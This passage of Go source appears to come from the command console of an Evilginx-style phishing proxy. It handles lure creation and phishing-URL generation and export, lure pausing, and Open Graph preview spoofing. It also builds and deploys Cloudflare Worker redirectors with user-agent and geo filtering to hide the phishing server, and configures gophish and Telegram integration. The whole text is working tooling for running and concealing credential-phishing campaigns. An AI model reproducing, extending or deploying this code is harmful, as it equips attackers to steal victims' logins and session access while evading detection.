	cyan := color.New(color.FgCyan)
	dgray := color.New(color.FgHiBlack)
	white := color.New(color.FgHiWhite)

	pn := len(args)

	if pn == 0 {
		// list lures
		t.output("%s", t.sprintLures())
		return nil
	}
	if pn > 0 {
		switch args[0] {
		case "create":
			if pn == 2 {
				_, err := t.cfg.GetPhishlet(args[1])
				if err != nil {
					return err
				}
				// Use configured strategy for lure path generation
				strategy := t.cfg.GetLureGenerationStrategy()
				lurePath := GenRandomLureString(strategy)
				
				l := &Lure{
					Path:     "/" + lurePath,
					Phishlet: args[1],
				}
				t.cfg.AddLure(args[1], l)
				log.Info("created lure with ID: %d (strategy: %s, length: %d chars)", len(t.cfg.lures)-1, strategy, len(lurePath))
				return nil
			}
			return fmt.Errorf("incorrect number of arguments")
		case "get-url":
			if pn >= 2 {
				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
				if err != nil {
					return fmt.Errorf("get-url: %v", err)
				}
				l, err := t.cfg.GetLure(l_id)
				if err != nil {
					return fmt.Errorf("get-url: %v", err)
				}
				pl, err := t.cfg.GetPhishlet(l.Phishlet)
				if err != nil {
					return fmt.Errorf("get-url: %v", err)
				}
				bhost, ok := t.cfg.GetSiteDomain(pl.Name)
				if !ok || len(bhost) == 0 {
					return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
				}

				var base_url string
				if l.Hostname != "" {
					base_url = "https://" + l.Hostname + l.Path
				} else {
					purl, err := pl.GetLureUrl(l.Path)
					if err != nil {
						return err
					}
					base_url = purl
				}

				var phish_urls []string
				var phish_params []map[string]string
				var out string

				params := url.Values{}
				if pn > 2 {
					if args[2] == "import" {
						if pn < 4 {
							return fmt.Errorf("get-url: no import path specified")
						}
						params_file := args[3]

						phish_urls, phish_params, err = t.importParamsFromFile(base_url, params_file)
						if err != nil {
							return fmt.Errorf("get_url: %v", err)
						}

						if pn >= 5 {
							if args[4] == "export" {
								if pn == 5 {
									return fmt.Errorf("get-url: no export path specified")
								}
								export_path := args[5]

								format := "text"
								if pn == 7 {
									format = args[6]
								}

								err = t.exportPhishUrls(export_path, phish_urls, phish_params, format)
								if err != nil {
									return fmt.Errorf("get-url: %v", err)
								}
								out = hiblue.Sprintf("exported %d phishing urls to file: %s\n", len(phish_urls), export_path)
								phish_urls = []string{}
							} else {
								return fmt.Errorf("get-url: expected 'export': %s", args[4])
							}
						}

					} else {
						// params present
						for n := 2; n < pn; n++ {
							val := args[n]

							sp := strings.Index(val, "=")
							if sp == -1 {
								return fmt.Errorf("to set custom parameters for the phishing url, use format 'param1=value1 param2=value2'")
							}
							k := val[:sp]
							v := val[sp+1:]

							params.Add(k, v)

							log.Info("adding parameter: %s='%s'", k, v)
						}
						phish_urls = append(phish_urls, t.createPhishUrl(base_url, &params))
					}
				} else {
					phish_urls = append(phish_urls, t.createPhishUrl(base_url, &params))
				}

				for n, phish_url := range phish_urls {
					out += hiblue.Sprint(phish_url)

					var params_row string
					var params string
					if len(phish_params) > 0 {
						params_row := phish_params[n]
						m := 0
						for k, v := range params_row {
							if m > 0 {
								params += " "
							}
							params += fmt.Sprintf("%s=\"%s\"", k, v)
							m += 1
						}
					}

					if len(params_row) > 0 {
						out += " ; " + params
					}
					out += "\n"
				}

				t.output("%s", out)
				return nil
			}
			return fmt.Errorf("incorrect number of arguments")
		case "pause":
			if pn == 3 {
				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}
				l, err := t.cfg.GetLure(l_id)
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}
				s_duration := args[2]

				t_dur, err := ParseDurationString(s_duration)
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}
				t_now := time.Now()
				log.Info("current time: %s", t_now.Format("2006-01-02 15:04:05"))
				log.Info("unpauses at:  %s", t_now.Add(t_dur).Format("2006-01-02 15:04:05"))

				l.PausedUntil = t_now.Add(t_dur).Unix()
				err = t.cfg.SetLure(l_id, l)
				if err != nil {
					return fmt.Errorf("edit: %v", err)
				}
				return nil
			}
		case "unpause":
			if pn == 2 {
				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}
				l, err := t.cfg.GetLure(l_id)
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}

				log.Info("lure for phishlet '%s' unpaused", l.Phishlet)

				l.PausedUntil = 0
				err = t.cfg.SetLure(l_id, l)
				if err != nil {
					return fmt.Errorf("edit: %v", err)
				}
				return nil
			}
		case "edit":
			if pn == 4 {
				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
				if err != nil {
					return fmt.Errorf("edit: %v", err)
				}
				l, err := t.cfg.GetLure(l_id)
				if err != nil {
					return fmt.Errorf("edit: %v", err)
				}
				val := args[3]
				do_update := false

				switch args[2] {
				case "hostname":
					if val != "" {
						val = strings.ToLower(val)

						if val != t.cfg.general.Domain && !strings.HasSuffix(val, "."+t.cfg.general.Domain) {
							return fmt.Errorf("edit: lure hostname must end with the base domain '%s'", t.cfg.general.Domain)
						}
						host_re := regexp.MustCompile(`^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$`)
						if !host_re.MatchString(val) {
							return fmt.Errorf("edit: invalid hostname")
						}

						l.Hostname = val
						t.cfg.refreshActiveHostnames()
						t.manageCertificates(true)
					} else {
						l.Hostname = ""
					}
					do_update = true
					log.Info("hostname = '%s'", l.Hostname)
				case "path":
					if val != "" {
						u, err := url.Parse(val)
						if err != nil {
							return fmt.Errorf("edit: %v", err)
						}
						l.Path = u.EscapedPath()
						if len(l.Path) == 0 || l.Path[0] != '/' {
							l.Path = "/" + l.Path
						}
					} else {
						l.Path = "/"
					}
					do_update = true
					log.Info("path = '%s'", l.Path)
				case "redirect_url":
					if val != "" {
						u, err := url.Parse(val)
						if err != nil {
							return fmt.Errorf("edit: %v", err)
						}
						if !u.IsAbs() {
							return fmt.Errorf("edit: redirect url must be absolute")
						}
						l.RedirectUrl = u.String()
					} else {
						l.RedirectUrl = ""
					}
					do_update = true
					log.Info("redirect_url = '%s'", l.RedirectUrl)
				case "phishlet":
					_, err := t.cfg.GetPhishlet(val)
					if err != nil {
						return fmt.Errorf("edit: %v", err)
					}
					l.Phishlet = val
					do_update = true
					log.Info("phishlet = '%s'", l.Phishlet)
				case "info":
					l.Info = val
					do_update = true
					log.Info("info = '%s'", l.Info)
				case "og_title":
					l.OgTitle = val
					do_update = true
					log.Info("og_title = '%s'", l.OgTitle)
				case "og_desc":
					l.OgDescription = val
					do_update = true
					log.Info("og_desc = '%s'", l.OgDescription)
				case "og_image":
					if val != "" {
						u, err := url.Parse(val)
						if err != nil {
							return fmt.Errorf("edit: %v", err)
						}
						if !u.IsAbs() {
							return fmt.Errorf("edit: image url must be absolute")
						}
						l.OgImageUrl = u.String()
					} else {
						l.OgImageUrl = ""
					}
					do_update = true
					log.Info("og_image = '%s'", l.OgImageUrl)
				case "og_url":
					if val != "" {
						u, err := url.Parse(val)
						if err != nil {
							return fmt.Errorf("edit: %v", err)
						}
						if !u.IsAbs() {
							return fmt.Errorf("edit: site url must be absolute")
						}
						l.OgUrl = u.String()
					} else {
						l.OgUrl = ""
					}
					do_update = true
					log.Info("og_url = '%s'", l.OgUrl)
				case "redirector":
					if val != "" {
						path := val
						if !filepath.IsAbs(val) {
							redirectors_dir := t.cfg.GetRedirectorsDir()
							path = filepath.Join(redirectors_dir, val)
						}

						if _, err := os.Stat(path); !os.IsNotExist(err) {
							l.Redirector = val
						} else {
							return fmt.Errorf("edit: redirector directory does not exist: %s", path)
						}
					} else {
						l.Redirector = ""
					}
					do_update = true
					log.Info("redirector = '%s'", l.Redirector)
				case "ua_filter":
					if val != "" {
						if _, err := regexp.Compile(val); err != nil {
							return err
						}

						l.UserAgentFilter = val
					} else {
						l.UserAgentFilter = ""
					}
					do_update = true
					log.Info("ua_filter = '%s'", l.UserAgentFilter)
				}
				if do_update {
					err := t.cfg.SetLure(l_id, l)
					if err != nil {
						return fmt.Errorf("edit: %v", err)
					}
					return nil
				}
			} else {
				return fmt.Errorf("incorrect number of arguments")
			}
		case "delete":
			if pn == 2 {
				if len(t.cfg.lures) == 0 {
					break
				}
				if args[1] == "all" {
					di := []int{}
					for n := range t.cfg.lures {
						di = append(di, n)
					}
					if len(di) > 0 {
						rdi := t.cfg.DeleteLures(di)
						for _, id := range rdi {
							log.Info("deleted lure with ID: %d", id)
						}
					}
					return nil
				} else {
					rc := strings.Split(args[1], ",")
					di := []int{}
					for _, pc := range rc {
						pc = strings.TrimSpace(pc)
						rd := strings.Split(pc, "-")
						if len(rd) == 2 {
							b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
							if err != nil {
								return fmt.Errorf("delete: %v", err)
							}
							e_id, err := strconv.Atoi(strings.TrimSpace(rd[1]))
							if err != nil {
								return fmt.Errorf("delete: %v", err)
							}
							for i := b_id; i <= e_id; i++ {
								di = append(di, i)
							}
						} else if len(rd) == 1 {
							b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
							if err != nil {
								return fmt.Errorf("delete: %v", err)
							}
							di = append(di, b_id)
						}
					}
					if len(di) > 0 {
						rdi := t.cfg.DeleteLures(di)
						for _, id := range rdi {
							log.Info("deleted lure with ID: %d", id)
						}
					}
					return nil
				}
			}
			return fmt.Errorf("incorrect number of arguments")
		default:
			id, err := strconv.Atoi(args[0])
			if err != nil {
				return err
			}
			l, err := t.cfg.GetLure(id)
			if err != nil {
				return err
			}

			var s_paused string = higreen.Sprint(GetDurationString(time.Now(), time.Unix(l.PausedUntil, 0)))

			keys := []string{"phishlet", "hostname", "path", "redirector", "ua_filter", "redirect_url", "paused", "info", "og_title", "og_desc", "og_image", "og_url"}
			vals := []string{hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), green.Sprint(l.UserAgentFilter), yellow.Sprint(l.RedirectUrl), s_paused, l.Info, dgray.Sprint(l.OgTitle), dgray.Sprint(l.OgDescription), dgray.Sprint(l.OgImageUrl), dgray.Sprint(l.OgUrl)}
			log.Printf("\n%s\n", AsRows(keys, vals))

			return nil
		}
	}

	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handleCloudflare(args []string) error {
	hiblue := color.New(color.FgHiBlue)
	yellow := color.New(color.FgYellow)
	higreen := color.New(color.FgHiGreen)
	hcyan := color.New(color.FgHiCyan)
	red := color.New(color.FgRed)

	pn := len(args)

	if pn == 0 {
		// Show usage
		log.Info("usage:")
		log.Info("  cloudflare worker <type> <redirect_url> [options]  - generate worker script")
		log.Info("  cloudflare deploy <worker_name> <type> <redirect_url> [options]  - deploy worker")
		log.Info("  cloudflare list                                     - list deployed workers")
		log.Info("  cloudflare delete <worker_name>                     - delete a worker")
		log.Info("  cloudflare update <worker_name> <redirect_url>      - update worker redirect")
		log.Info("  cloudflare status <worker_name>                     - check worker status")
		log.Info("  cloudflare config                                   - show configuration")
		log.Info("")
		log.Info("worker types: simple, html, advanced")
		log.Info("options:")
		log.Info("  --lure <id>         Use lure configuration")
		log.Info("  --ua-filter <regex> User-Agent filter regex")
		log.Info("  --geo <countries>   Geo filter (comma-separated country codes)")
		log.Info("  --delay <seconds>   Delay before redirect")
		log.Info("  --log               Enable request logging")
		log.Info("  --route <pattern>   Custom route pattern (deploy only)")
		log.Info("  --subdomain         Enable workers.dev subdomain (deploy only)")
		return nil
	}

	if pn > 0 && args[0] == "worker" {
		if pn < 3 {
			return fmt.Errorf("usage: cloudflare worker <type> <redirect_url>")
		}

		workerType := args[1]
		redirectUrl := args[2]
		
		var config CloudflareWorkerConfig
		config.LogRequests = false
		config.DelaySeconds = 0

		// Parse worker type
		switch workerType {
		case "simple":
			config.Type = WorkerTypeSimpleRedirect
		case "html":
			config.Type = WorkerTypeHtmlRedirector
			config.DelaySeconds = 2
		case "advanced":
			config.Type = WorkerTypeAdvanced
			config.DelaySeconds = 2
			config.LogRequests = true
		default:
			return fmt.Errorf("invalid worker type: %s (use: simple, html, advanced)", workerType)
		}

		// Handle special case for lure-based generation
		if redirectUrl == "--lure" && pn > 3 {
			lureId, err := strconv.Atoi(args[3])
			if err != nil {
				return fmt.Errorf("invalid lure ID: %v", err)
			}
			
			lure, err := t.cfg.GetLure(lureId)
			if err != nil {
				return fmt.Errorf("lure not found: %v", err)
			}
			
			if lure.Hostname != "" && lure.Path != "" {
				redirectUrl = fmt.Sprintf("https://%s%s", lure.Hostname, lure.Path)
				if lure.UserAgentFilter != "" {
					config.UserAgentFilter = lure.UserAgentFilter
				}
				log.Info("using lure %d: %s", lureId, hiblue.Sprint(lure.Phishlet))
			} else {
				return fmt.Errorf("lure %d has no hostname or path configured", lureId)
			}
		} else {
			config.RedirectUrl = redirectUrl
		}

		// Parse additional options
		for i := 3; i < pn; i++ {
			switch args[i] {
			case "--ua-filter":
				if i+1 < pn {
					config.UserAgentFilter = args[i+1]
					i++
				}
			case "--geo":
				if i+1 < pn {
					config.GeoFilter = strings.Split(args[i+1], ",")
					i++
				}
			case "--delay":
				if i+1 < pn {
					delay, err := strconv.Atoi(args[i+1])
					if err == nil {
						config.DelaySeconds = delay
					}
					i++
				}
			case "--log":
				config.LogRequests = true
			}
		}

		// Generate the worker
		generator := NewCloudflareWorkerGenerator(t.cfg)
		workerScript, err := generator.GenerateWorker(config)
		if err != nil {
			return fmt.Errorf("failed to generate worker: %v", err)
		}

		// Write to file
		filename := fmt.Sprintf("cloudflare-worker-%s-%s.js", workerType, time.Now().Format("20060102-150405"))
		err = ioutil.WriteFile(filename, []byte(workerScript), 0644)
		if err != nil {
			return fmt.Errorf("failed to write worker script: %v", err)
		}

		log.Info("generated Cloudflare Worker script: %s", higreen.Sprint(filename))
		log.Info("redirect URL: %s", yellow.Sprint(config.RedirectUrl))
		if config.UserAgentFilter != "" {
			log.Info("UA filter: %s", hcyan.Sprint(config.UserAgentFilter))
		}
		if len(config.GeoFilter) > 0 {
			log.Info("geo filter: %s", hcyan.Sprint(strings.Join(config.GeoFilter, ", ")))
		}
		log.Info("deploy this script to Cloudflare Workers to create your redirector")
		
		return nil
	}

	// Handle 'cloudflare config' command
	if pn > 0 && args[0] == "config" {
		cfConfig := t.cfg.GetCloudflareWorkerConfig()
		
		log.Info("cloudflare worker configuration:")
		log.Info("  enabled: %v", cfConfig.Enabled)
		if cfConfig.AccountID != "" {
			log.Info("  account_id: %s", hiblue.Sprint(cfConfig.AccountID))
		} else {
			log.Info("  account_id: %s", red.Sprint("not set"))
		}
		if cfConfig.APIToken != "" {
			log.Info("  api_token: %s", hiblue.Sprint("***hidden***"))
		} else {
			log.Info("  api_token: %s", red.Sprint("not set"))
		}
		if cfConfig.ZoneID != "" {
			log.Info("  zone_id: %s", hiblue.Sprint(cfConfig.ZoneID))
		} else {
			log.Info("  zone_id: %s", yellow.Sprint("not set (optional)"))
		}
		if cfConfig.WorkerSubdomain != "" {
			log.Info("  subdomain: %s", hiblue.Sprint(cfConfig.WorkerSubdomain))
		} else {
			log.Info("  subdomain: %s", yellow.Sprint("not set"))
		}
		
		if !t.cfg.IsCloudflareWorkerEnabled() {
			log.Warning("cloudflare worker deployment is not properly configured")
			log.Info("use 'config cloudflare_worker <setting> <value>' to configure")
		}
		return nil
	}

	// Handle 'cloudflare deploy' command
	if pn > 0 && args[0] == "deploy" {
		if !t.cfg.IsCloudflareWorkerEnabled() {
			return fmt.Errorf("cloudflare worker deployment is not configured. Run 'config cloudflare_worker' commands first")
		}
		
		if pn < 4 {
			return fmt.Errorf("usage: cloudflare deploy <worker_name> <type> <redirect_url> [options]")
		}
		
		workerName := args[1]
		workerType := args[2]
		redirectUrl := args[3]
		
		// Parse worker configuration
		var config CloudflareWorkerConfig
		config.LogRequests = false
		config.DelaySeconds = 0
		
		// Parse worker type
		switch workerType {
		case "simple":
			config.Type = WorkerTypeSimpleRedirect
		case "html":
			config.Type = WorkerTypeHtmlRedirector
			config.DelaySeconds = 2
		case "advanced":
			config.Type = WorkerTypeAdvanced
			config.DelaySeconds = 2
			config.LogRequests = true
		default:
			return fmt.Errorf("invalid worker type: %s (use: simple, html, advanced)", workerType)
		}
		
		config.RedirectUrl = redirectUrl
		
		// Parse additional options
		var routes []string
		enableSubdomain := false
		
		for i := 4; i < pn; i++ {
			switch args[i] {
			case "--ua-filter":
				if i+1 < pn {
					config.UserAgentFilter = args[i+1]
					i++
				}
			case "--geo":
				if i+1 < pn {
					config.GeoFilter = strings.Split(args[i+1], ",")
					i++
				}
			case "--delay":
				if i+1 < pn {
					delay, err := strconv.Atoi(args[i+1])
					if err == nil {
						config.DelaySeconds = delay
					}
					i++
				}
			case "--log":
				config.LogRequests = true
			case "--route":
				if i+1 < pn {
					routes = append(routes, args[i+1])
					i++
				}
			case "--subdomain":
				enableSubdomain = true
			}
		}
		
		// Generate the worker script
		generator := NewCloudflareWorkerGenerator(t.cfg)
		workerScript, err := generator.GenerateWorker(config)
		if err != nil {
			return fmt.Errorf("failed to generate worker: %v", err)
		}
		
		// Deploy the worker
		cfConfig := t.cfg.GetCloudflareWorkerConfig()
		api := NewCloudflareWorkerAPI(cfConfig.AccountID, cfConfig.APIToken, cfConfig.ZoneID)
		
		deployment := &CloudflareWorkerDeployment{
			Name:      workerName,
			Script:    workerScript,
			Routes:    routes,
			Subdomain: enableSubdomain,
		}
		
		log.Info("deploying worker '%s' to Cloudflare...", hiblue.Sprint(workerName))
		err = api.DeployWorker(deployment)
		if err != nil {
			return fmt.Errorf("deployment failed: %v", err)
		}
		
		log.Success("worker '%s' deployed successfully!", higreen.Sprint(workerName))
		log.Info("redirect URL: %s", yellow.Sprint(config.RedirectUrl))
		
		if enableSubdomain {
			if cfConfig.WorkerSubdomain != "" {
				workerURL := fmt.Sprintf("https://%s.%s.workers.dev", workerName, cfConfig.WorkerSubdomain)
				log.Info("worker URL: %s", higreen.Sprint(workerURL))
			} else {
				log.Info("worker URL: %s", yellow.Sprint("Configure 'cloudflare_worker subdomain' to see URL"))
			}
		}
		
		return nil
	}

	// Handle 'cloudflare list' command
	if pn > 0 && args[0] == "list" {
		if !t.cfg.IsCloudflareWorkerEnabled() {
			return fmt.Errorf("cloudflare worker deployment is not configured")
		}
		
		cfConfig := t.cfg.GetCloudflareWorkerConfig()
		api := NewCloudflareWorkerAPI(cfConfig.AccountID, cfConfig.APIToken, cfConfig.ZoneID)
		
		log.Info("fetching deployed workers...")
		workers, err := api.ListWorkers()
		if err != nil {
			return fmt.Errorf("failed to list workers: %v", err)
		}
		
		if len(workers) == 0 {
			log.Info("no workers deployed")
			return nil
		}
		
		log.Info("deployed workers:")
		for _, worker := range workers {
			log.Info("  %s", hiblue.Sprint(worker.ID))
			
			// Construct worker URL
			var workerURL string
			if cfConfig.WorkerSubdomain != "" {
				// Use configured worker subdomain (this should be your Cloudflare account subdomain)
				workerURL = fmt.Sprintf("https://%s.%s.workers.dev", worker.ID, cfConfig.WorkerSubdomain)
				log.Info("    url: %s", higreen.Sprint(workerURL))
			} else {
				// No subdomain configured - show instructions
				log.Info("    url: %s", yellow.Sprint("Configure 'cloudflare_worker subdomain' to see worker URL"))
				log.Info("         %s", "(Get your subdomain from Cloudflare dashboard -> Workers & Pages)")
			}
			
			// Show size information
			if worker.Size > 0 {
				log.Info("    size: %d bytes", worker.Size)
			} else {
				// Size 0 is normal for Workers using the ES modules format
				log.Info("    status: %s", higreen.Sprint("✓ deployed"))
			}
			
			log.Info("    created: %s", worker.CreatedOn.Format("2006-01-02 15:04:05"))
			log.Info("    modified: %s", worker.ModifiedOn.Format("2006-01-02 15:04:05"))
		}
		
		// List routes if zone ID is configured
		if cfConfig.ZoneID != "" {
			routes, err := api.ListWorkerRoutes()
			if err == nil && len(routes) > 0 {
				log.Info("\nworker routes:")
				for _, route := range routes {
					log.Info("  %s -> %s", yellow.Sprint(route.Pattern), hiblue.Sprint(route.Script))
				}
			}
		}
		
		return nil
	}

	// Handle 'cloudflare delete' command
	if pn > 0 && args[0] == "delete" {
		if !t.cfg.IsCloudflareWorkerEnabled() {
			return fmt.Errorf("cloudflare worker deployment is not configured")
		}
		
		if pn < 2 {
			return fmt.Errorf("usage: cloudflare delete <worker_name>")
		}
		
		workerName := args[1]
		
		cfConfig := t.cfg.GetCloudflareWorkerConfig()
		api := NewCloudflareWorkerAPI(cfConfig.AccountID, cfConfig.APIToken, cfConfig.ZoneID)
		
		log.Warning("deleting worker '%s'...", workerName)
		err := api.DeleteWorker(workerName)
		if err != nil {
			return fmt.Errorf("failed to delete worker: %v", err)
		}
		
		log.Success("worker '%s' deleted successfully", workerName)
		return nil
	}

	// Handle 'cloudflare update' command
	if pn > 0 && args[0] == "update" {
		if !t.cfg.IsCloudflareWorkerEnabled() {
			return fmt.Errorf("cloudflare worker deployment is not configured")
		}
		
		if pn < 3 {
			return fmt.Errorf("usage: cloudflare update <worker_name> <redirect_url>")
		}
		
		workerName := args[1]
		redirectUrl := args[2]
		
		// Generate a simple redirect worker with new URL
		config := CloudflareWorkerConfig{
			Type:         WorkerTypeSimpleRedirect,
			RedirectUrl:  redirectUrl,
			LogRequests:  true,
			DelaySeconds: 0,
		}
		
		generator := NewCloudflareWorkerGenerator(t.cfg)
		workerScript, err := generator.GenerateWorker(config)
		if err != nil {
			return fmt.Errorf("failed to generate worker: %v", err)
		}
		
		cfConfig := t.cfg.GetCloudflareWorkerConfig()
		api := NewCloudflareWorkerAPI(cfConfig.AccountID, cfConfig.APIToken, cfConfig.ZoneID)
		
		log.Info("updating worker '%s'...", hiblue.Sprint(workerName))
		err = api.UpdateWorker(workerName, workerScript)
		if err != nil {
			return fmt.Errorf("failed to update worker: %v", err)
		}
		
		log.Success("worker '%s' updated successfully", workerName)
		log.Info("new redirect URL: %s", yellow.Sprint(redirectUrl))
		return nil
	}

	// Handle 'cloudflare status' command
	if pn > 0 && args[0] == "status" {
		if !t.cfg.IsCloudflareWorkerEnabled() {
			return fmt.Errorf("cloudflare worker deployment is not configured")
		}
		
		if pn < 2 {
			return fmt.Errorf("usage: cloudflare status <worker_name>")
		}
		
		workerName := args[1]
		
		cfConfig := t.cfg.GetCloudflareWorkerConfig()
		api := NewCloudflareWorkerAPI(cfConfig.AccountID, cfConfig.APIToken, cfConfig.ZoneID)
		
		log.Info("checking worker '%s' status...", hiblue.Sprint(workerName))
		exists, err := api.GetWorkerStatus(workerName)
		if err != nil {
			return fmt.Errorf("failed to check worker status: %v", err)
		}
		
		if exists {
			log.Success("worker '%s' is deployed and active", higreen.Sprint(workerName))
			
			// Get subdomain info
			subdomain, err := api.GetWorkerSubdomain()
			if err == nil && subdomain != "" {
				log.Info("worker URL: https://%s.%s.workers.dev", hiblue.Sprint(workerName), hiblue.Sprint(subdomain))
			}
		} else {
			log.Warning("worker '%s' is not deployed", workerName)
		}
		
		return nil
	}

	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) monitorLurePause() {
	var pausedLures map[string]int64
	pausedLures = make(map[string]int64)

	for {
		t_cur := time.Now()

		for n, l := range t.cfg.lures {
			if l.PausedUntil > 0 {
				l_id := t.cfg.lureIds[n]
				t_pause := time.Unix(l.PausedUntil, 0)
				if t_pause.After(t_cur) {
					pausedLures[l_id] = l.PausedUntil
				} else {
					if _, ok := pausedLures[l_id]; ok {
						log.Info("[%s] lure (%d) is now active", l.Phishlet, n)
					}
					pausedLures[l_id] = 0
					l.PausedUntil = 0
				}
			}
		}

		time.Sleep(500 * time.Millisecond)
	}
}

func (t *Terminal) createHelp() {
	h, _ := NewHelp()
	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
			readline.PcItem("lure_strategy", readline.PcItem("short"), readline.PcItem("medium"), readline.PcItem("long"), readline.PcItem("realistic"), readline.PcItem("hex"), readline.PcItem("base64"), readline.PcItem("mixed")),
			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
			readline.PcItem("telegram", readline.PcItem("bot_token"), readline.PcItem("chat_id"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
			readline.PcItem("cloudflare_worker", readline.PcItem("account_id"), readline.PcItem("api_token"), readline.PcItem("zone_id"), readline.PcItem("subdomain"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test"))))
	h.AddSubCommand("config", nil, "", "show all configuration variables")
	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ipv4_address>", "set ipv4 external address of the current server")
	h.AddSubCommand("config", []string{"ipv4", "external"}, "ipv4 external <ipv4_address>", "set ipv4 external address of the current server")
	h.AddSubCommand("config", []string{"ipv4", "bind"}, "ipv4 bind <ipv4_address>", "set ipv4 bind address of the current server")
	h.AddSubCommand("config", []string{"unauth_url"}, "unauth_url <url>", "change the url where all unauthorized requests will be redirected to")
	h.AddSubCommand("config", []string{"autocert"}, "autocert <on|off>", "enable or disable the automated certificate retrieval from letsencrypt")
	h.AddSubCommand("config", []string{"lure_strategy"}, "lure_strategy <strategy>", "set lure URL generation strategy: short (12-16 chars), medium (16-24 chars), long (24-32 chars), realistic (patterns), hex (32-40 hex), base64 (20-28 base64), mixed (random)")
	h.AddSubCommand("config", []string{"gophish", "admin_url"}, "gophish admin_url <url>", "set up the admin url of a gophish instance to communicate with (e.g. https://gophish.domain.com:7777)")
	h.AddSubCommand("config", []string{"gophish", "api_key"}, "gophish api_key <key>", "set up the api key for the gophish instance to communicate with")
	h.AddSubCommand("config", []string{"gophish", "insecure"}, "gophish insecure <true|false>", "enable or disable the verification of gophish tls certificate (set to `true` if using self-signed certificate)")
	h.AddSubCommand("config", []string{"gophish", "test"}, "gophish test", "test the gophish configuration")
	h.AddSubCommand("config", []string{"telegram", "bot_token"}, "telegram bot_token <token>", "set up the Telegram bot token for notifications")
	h.AddSubCommand("config", []string{"telegram", "chat_id"}, "telegram chat_id <chat_id>", "set up the Telegram chat ID where notifications will be sent")
	h.AddSubCommand("config", []string{"telegram", "enabled"}, "telegram enabled <true|false>", "enable or disable Telegram notifications")
	h.AddSubCommand("config", []string{"telegram", "test"}, "telegram test", "test the Telegram configuration by sending a test message")
	h.AddSubCommand("config", []string{"cloudflare_worker", "account_id"}, "cloudflare_worker account_id <id>", "set the Cloudflare account ID for Worker deployment")
	h.AddSubCommand("config", []string{"cloudflare_worker", "api_token"}, "cloudflare_worker api_token <token>", "set the Cloudflare API token for Worker deployment")
	h.AddSubCommand("config", []string{"cloudflare_worker", "zone_id"}, "cloudflare_worker zone_id <id>", "set the Cloudflare zone ID for custom routes (optional)")
	h.AddSubCommand("config", []string{"cloudflare_worker", "subdomain"}, "cloudflare_worker subdomain <subdomain>", "set the workers.dev subdomain (optional)")
	h.AddSubCommand("config", []string{"cloudflare_worker", "enabled"}, "cloudflare_worker enabled <true|false>", "enable or disable Cloudflare Worker deployment")
	h.AddSubCommand("config", []string{"cloudflare_worker", "test"}, "cloudflare_worker test", "test the Cloudflare Worker credentials")

	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
	h.AddSubCommand("proxy", nil, "", "show all configuration variables")
	h.AddSubCommand("proxy", []string{"enable"}, "enable", "enable proxy")
	h.AddSubCommand("proxy", []string{"disable"}, "disable", "disable proxy")
	h.AddSubCommand("proxy", []string{"type"}, "type <type>", "set proxy type: http (default), https, socks5, socks5h")
	h.AddSubCommand("proxy", []string{"address"}, "address <address>", "set proxy address")
	h.AddSubCommand("proxy", []string{"port"}, "port <port>", "set proxy port")
	h.AddSubCommand("proxy", []string{"username"}, "username <username>", "set proxy authentication username")
	h.AddSubCommand("proxy", []string{"password"}, "password <password>", "set proxy authentication password")

	h.AddCommand("phishlets", "general", "manage phishlets configuration", "Shows status of all available phishlets and allows to change their parameters and enabled status.", LAYER_TOP,
		readline.PcItem("phishlets", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("delete", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("hostname", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("enable", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("disable", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("hide", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("unauth_url", readline.PcItemDynamic(t.phishletPrefixCompleter))))
	h.AddSubCommand("phishlets", nil, "", "show status of all available phishlets")
	h.AddSubCommand("phishlets", nil, "<phishlet>", "show details of a specific phishlets")
	h.AddSubCommand("phishlets", []string{"create"}, "create <phishlet> <child_name> <key1=value1> <key2=value2>", "create child phishlet from a template phishlet with custom parameters")
	h.AddSubCommand("phishlets", []string{"delete"}, "delete <phishlet>", "delete child phishlet")
